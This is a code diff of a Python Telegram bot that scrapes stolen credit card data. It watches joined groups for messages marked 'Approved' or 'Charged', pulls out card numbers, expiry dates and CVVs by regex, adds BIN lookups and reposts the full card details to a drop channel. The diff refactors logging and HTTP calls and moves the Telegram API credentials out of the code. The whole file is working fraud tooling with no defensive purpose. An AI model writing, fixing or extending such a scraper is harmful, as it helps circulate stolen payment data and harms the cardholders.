@@ -1,40 +1,45 @@
+import os
 import pyrogram
 from pyrogram import Client, filters
 import re
-import aiohttp
+import requests  # Using requests instead of aiohttp
+import logging
 
-# Telegram bot setup
+# Setup logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# Telegram bot setup using environment variables
 app = Client(
     'mrdaxx_scrapper',
-    api_id=27649783,
-    api_hash='834fd6015b50b781e0f8a41876ca95c8'
+    api_id=os.getenv('API_ID'),  # Use environment variables
+    api_hash=os.getenv('API_HASH')
 )
 
 # API for BIN lookup
-BIN_API_URL = 'https://astroboyapi.com/api/bin.php?bin={}'
+BIN_API_URL = 'https://bins.antipublic.cc/bins/{}'
 
 def filter_cards(text):
     try:
         regex = r'\b(\d{15,16})\D*(\d{2})\D*(\d{2,4})\D*(\d{3,4})\b'
         matches = re.findall(regex, text)
-        print(f"Filtered cards: {matches}")
+        logger.info(f"Filtered cards: {matches}")
         return matches
     except Exception as e:
-        print(f"Error in filter_cards: {e}")
+        logger.error(f"Error in filter_cards: {e}")
         return []
 
-async def bin_lookup(bin_number):
+def bin_lookup(bin_number):
     bin_info_url = BIN_API_URL.format(bin_number)
-    async with aiohttp.ClientSession() as session:
-        try:
-            async with session.get(bin_info_url) as response:
-                if response.status == 200:
-                    print(f"BIN lookup successful for {bin_number}")
-                    return await response.json()
-                else:
-                    print(f"BIN lookup failed with status {response.status} for {bin_number}")
-        except Exception as e:
-            print(f"Error during BIN lookup for {bin_number}: {e}")
+    try:
+        response = requests.get(bin_info_url)
+        if response.status_code == 200:
+            logger.info(f"BIN lookup successful for {bin_number}")
+            return response.json()
+        else:
+            logger.warning(f"BIN lookup failed with status {response.status_code} for {bin_number}")
+    except Exception as e:
+        logger.error(f"Error during BIN lookup for {bin_number}: {e}")
     return None
 
 async def approved(client_instance, message):
@@ -42,17 +47,14 @@ async def approved(client_instance, message):
         if re.search(r'(Approved!|Charged|authenticate_successful|𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱|APPROVED|🔥|New Cards Found By DaxxScrapper|ꕥ Extrap [☭]|み RIMURU SCRAPE by|Approved) ✅', message.text):
             filtered_card_info = filter_cards(message.text)
             if not filtered_card_info:
-                print("No valid card information found in message.")
+                logger.info("No valid card information found in message.")
                 return
 
             for card in filtered_card_info:
                 try:
-                    # Extract individual components from card tuple
                     card_number, month, year, cvv = card
-
-                    # Perform BIN lookup
                     bin_number = card_number[:6]
-                    bin_info = await bin_lookup(bin_number)
+                    bin_info = bin_lookup(bin_number)  # Synchronous call to new API
                     if bin_info:
                         brand = bin_info.get("brand", "N/A")
                         card_type = bin_info.get("type", "N/A")
@@ -76,25 +78,24 @@ async def approved(client_instance, message):
                             "**⦿ 𝖢𝖱𝖤𝖠𝖳𝖮𝖱** ➠ <b>@Vclubcharge</b>"
                         )
 
-                        # Send message to Telegram channel
                         await client_instance.send_message(chat_id='@CHARGECCDROP', text=formatted_message)
-                        print("Message sent to channel successfully.")
+                        logger.info("Message sent to channel successfully.")
                 except Exception as e:
-                    print(f"Error processing card info {card}: {e}")
+                    logger.error(f"Error processing card info {card}: {e}")
     except Exception as e:
-        print(f"An error occurred in approved function: {e}")
+        logger.error(f"An error occurred in approved function: {e}")
 
 @app.on_message(filters.text & (filters.group | filters.channel | filters.all))
 async def forward_all(client_instance, message):
     try:
-        print("Forwarding message from joined group or channel.")
+        logger.info("Forwarding message from joined group or channel.")
         await approved(client_instance, message)
     except Exception as e:
-        print(f"Error in forward_all function: {e}")
+        logger.error(f"Error in forward_all function: {e}")
 
-try:
-    print("Starting bot...")
-    app.run()
-except Exception as e:
-    print(f"Error starting the bot: {e}")
-    
+if __name__ == "__main__":
+    try:
+        logger.info("Starting bot...")
+        app.run()
+    except Exception as e:
+        logger.error(f"Error starting the bot: {e}")
